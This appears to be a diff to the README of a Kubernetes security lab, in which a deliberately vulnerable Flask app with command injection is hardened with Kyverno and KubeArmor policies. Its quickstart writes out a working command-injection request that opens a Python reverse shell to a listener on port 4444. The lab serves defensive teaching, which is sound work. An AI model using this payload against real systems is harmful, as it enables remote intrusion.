@@ -8,7 +8,7 @@ We walk through an end-to-end Kubernetes security journey using a vulnerable Fla
 
 ## Directory Structure
 
-\`\`\`
+```bash
 k8s-enforcement-lab/
 ├── RootDockerfile                     # Vulnerable app container with root
 ├── NonRootDockerfile                  # Vulnerable app container without root
@@ -16,15 +16,16 @@ k8s-enforcement-lab/
 ├── templates/                         # HTML for test payloads
 ├── manifests/                         # Various Tests and Policies
 │   ├── insecure.yaml                  # Insecure workload spec (runs as root) and NodePort Service
+│   ├── secure.yaml                    # Secure workload spec (no root) and NodePort Service
 │   ├── kyverno-block-root.yaml        # Kyverno policy to block insecure pods
 │   └── kubearmor-mailroom-locks.yaml  # KubeArmor policy to restrict runtime behavior
 ├── README.md
-\`\`\`
+```
 
 ---
 
 ## App
-The app is a basic Python Flask server with an OS command injection vulnerability at \`/cmd\`. It simulates a realistic reverse shell scenario. The containers in the manifests are in Dockerhub so you don't have to create images if you so desire. All of this has been tested in a Kubeadm cluster with no problems.
+The app is a basic Python Flask server with an OS command injection vulnerability at `/cmd`. It simulates a realistic reverse shell scenario. The containers used in the manifests are hosted on Docker Hub, so you don't need to build your own images unless desired. All of this has been tested in a Kubeadm cluster with no problems.
 
 ## Scenarios
 Each directory in \`manifests/\` shows a different security stage:
@@ -51,42 +52,42 @@ Each directory in \`manifests/\` shows a different security stage:
 ## Quickstart (the slides show all the scenarios but this might be helpful)
 
 ### Deploy Vulnerable Workload and Service
-\`\`\`bash
+```bash
 kubectl apply -f manifests/insecure.yaml
-\`\`\`
+```
 
 ### Run the hack
 Listener in one terminal assuming Mac:
-\`\`\`bash
+```bash
 nc -l 4444
-\`\`\`
+```
 
 RCE in other terminal:
-\`\`\`bash
+```bash
 curl "http://\"app_ip_address\":30080/cmd" \
   --get \
   --data-urlencode 'input=python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"host_ip_address\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"sh\")"'
-\`\`\`
+```
 
 ### For full root block:
-\`\`\`bash
+```bash
 kubectl apply -f manifests/kyverno-block-root.yaml
-\`\`\`
+```
 
 ### Deploy Non Root workload:
-\`\`\`bash
+```bash
 kubectl apply -f manifests/secure.yaml
-\`\`\`
+```
 
 ### Create runtime enforcement policy:
-\`\`\`bash
+```bash
 kubectl apply -f manifests/kubearmor-mailroom-locks.yaml
-\`\`\`
+```
 
-### Test runtime enforcement policy:
-\`\`\`bash
+### Re-deploy the secure workload to test runtime policy in action
+```bash
 kubectl apply -f manifests/secure.yaml
-\`\`\`
+```
 
 ### Reuse RCE and try to start Python listener or write to tmp
 
